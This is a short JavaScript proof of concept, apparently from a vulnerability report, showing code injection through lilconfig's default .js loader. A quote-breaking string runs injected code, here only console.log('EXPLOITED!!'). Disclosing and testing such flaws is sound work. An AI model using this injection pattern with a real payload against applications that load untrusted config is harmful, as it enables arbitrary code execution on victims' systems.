const { defaultLoaders } = require('lilconfig');
const maliciousInput = "'+console.log('EXPLOITED!!')+'";
defaultLoaders[".js"](maliciousInput);
